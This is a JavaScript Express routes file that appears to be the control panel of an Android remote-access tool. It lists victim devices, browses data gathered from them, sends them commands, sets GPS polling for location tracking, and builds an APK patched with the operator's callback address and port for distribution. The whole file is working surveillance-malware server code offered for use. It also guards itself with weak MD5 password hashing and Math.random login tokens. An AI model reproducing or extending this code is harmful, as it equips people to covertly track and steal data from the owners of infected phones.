const
    express = require('express'),
    routes = express.Router(),
    cookieParser = require('cookie-parser'),
    bodyParser = require('body-parser'),
    crypto = require('crypto'),
    debug = require('./debug');

let CONST = global.CONST;
let db = global.db;
let logManager = global.logManager;
let app = global.app;
let clientManager = global.clientManager;
let apkBuilder = global.apkBuilder;

app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

function isAllowed(req, res, next) {
    let cookies = req.cookies;
    let loginToken = db.maindb.get('admin.loginToken').value();
    debug.route(`Auth check for ${req.path}`);
    
    if ('loginToken' in cookies) {
        if (cookies.loginToken === loginToken) {
            debug.route(`Auth successful for ${req.path}`);
            next();
        } else {
            debug.route(`Invalid token for ${req.path}`);
            res.clearCookie('token').redirect('/login');
        }
    } else {
        debug.route(`No token found for ${req.path}`);
        res.redirect('/login');
    }
}

routes.get('/dl', (req, res) => {
    debug.route('APK download requested');
    res.redirect('/build.s.apk');
});

routes.get('/', isAllowed, (req, res) => {
    debug.route('Home page requested');
    res.render('index', {
        clientsOnline: clientManager.getClientListOnline(),
        clientsOffline: clientManager.getClientListOffline()
    });
});

routes.get('/login', (req, res) => {
    debug.route('Login page requested');
    res.render('login');
});

routes.post('/login', (req, res) => {
    debug.route('Login attempt');
    if ('username' in req.body) {
        if ('password' in req.body) {
            let rUsername = db.maindb.get('admin.username').value();
            let rPassword = db.maindb.get('admin.password').value();
            let passwordMD5 = crypto.createHash('md5').update(req.body.password.toString()).digest("hex");
            if (req.body.username.toString() === rUsername && passwordMD5 === rPassword) {
                let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
                db.maindb.get('admin').assign({ loginToken }).write();
                debug.route('Login successful');
                res.cookie('loginToken', loginToken).redirect('/');
            } else {
                debug.route('Invalid credentials');
                return res.redirect('/login?e=badLogin');
            }
        } else {
            debug.route('Missing password');
            return res.redirect('/login?e=missingPassword');
        }
    } else {
        debug.route('Missing username');
        return res.redirect('/login?e=missingUsername');
    }
});

routes.get('/logout', isAllowed, (req, res) => {
    debug.route('Logout requested');
    db.maindb.get('admin').assign({ loginToken: '' }).write();
    res.redirect('/');
});

routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
    debug.route(`Device page requested: ${req.params.deviceid}/${req.params.page}`);
    
    // Get the device data using the clientID
    let device = [...clientManager.getClientListOnline(), ...clientManager.getClientListOffline()]
        .find(client => client.clientID === req.params.deviceid);
    
    let pageData = clientManager.getClientDataByPage(req.params.deviceid, req.params.page, req.query.filter);
    
    if (pageData && device) {
        debug.route(`Rendering device page: ${req.params.page}`);
        res.render('deviceManager', {
            page: req.params.page,
            deviceID: req.params.deviceid,
            baseURL: '/manage/' + req.params.deviceid,
            pageData,
            device
        });
    } else {
        debug.route(`Device or page not found: ${req.params.deviceid}/${req.params.page}`);
        res.render('deviceManager', {
            page: 'notFound',
            deviceID: req.params.deviceid,
            baseURL: '/manage/' + req.params.deviceid
        });
    }
});

routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
    debug.route(`Command requested: ${req.params.deviceid}/${req.params.commandID}`);
    clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.query, (error, message) => {
        if (!error) {
            debug.route(`Command successful: ${req.params.commandID}`);
            res.json({ error: false, message });
        } else {
            debug.route(`Command failed: ${req.params.commandID} - ${error}`);
            res.json({ error });
        }
    });
});

routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
    debug.route(`GPS poll speed update requested: ${req.params.deviceid}/${req.params.speed}`);
    clientManager.setGpsPollSpeed(req.params.deviceid, parseInt(req.params.speed), (error) => {
        if (!error) {
            debug.route('GPS poll speed updated successfully');
            res.json({ error: false });
        } else {
            debug.route(`GPS poll speed update failed: ${error}`);
            res.json({ error });
        }
    });
});

routes.get('/builder', isAllowed, (req, res) => {
    debug.route('APK builder page requested');
    res.render('builder', {
        myPort: CONST.control_port
    });
});

routes.post('/builder', isAllowed, (req, res) => {
    debug.route('APK build requested');
    if (!req.query.uri || !req.query.port) {
        return res.json({ error: 'URI and Port are required' });
    }

    apkBuilder.patchAPK(req.query.uri, req.query.port, (err) => {
        if (err) {
            debug.route(`APK patch failed: ${err}`);
            return res.json({ error: err });
        }
        apkBuilder.buildAPK((err) => {
            if (err) {
                debug.route(`APK build failed: ${err}`);
                return res.json({ error: err });
            }
            debug.route('APK built successfully');
            res.json({ error: false });
        });
    });
});

routes.get('/logs', isAllowed, (req, res) => {
    debug.route('Logs page requested');
    res.render('logs', {
        logs: logManager.getLogs()
    });
});

if (process.env.NODE_ENV === 'development') {
    // Development-only error handler
    routes.use((err, req, res, next) => {
        debug.route(`Error: ${err.message}`);
        console.error(err.stack);
        res.status(500).json({
            error: true,
            message: err.message,
            stack: err.stack
        });
    });
}

module.exports = routes;